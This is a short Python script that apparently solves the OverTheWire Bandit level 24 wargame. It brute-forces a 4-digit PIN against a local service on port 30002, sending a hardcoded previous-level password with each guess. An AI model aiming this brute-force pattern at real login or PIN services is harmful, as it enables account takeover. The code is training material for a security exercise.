import socket                                                                            
#Bandit24 needs to be bruteforced with 4 digit pins
 
#create a socket    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect (('localhost', 30002))

#Banit23 password
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
 
#bruteforce the fecker!
def pinCheck(s, password):
    count = 0 

    while count < 10000: 
        pin = password + " " + str(count).rjust(4, '0') + "\n" #Create the pin
        s.sendall(pin.encode())
        output = s.recv(2048)

        if "Wrong".encode() in output:
            pass
        else:
            print(output)
            s.close() #close it all off and quite, we found it. 
            exit(0)

        count += 1
    return 0
 
#Display the welcome message
hi = s.recv(2048)
print(hi)
 
#Run the bruteforce
pinCheck(s, password)
 
#Close it all off
s.close()
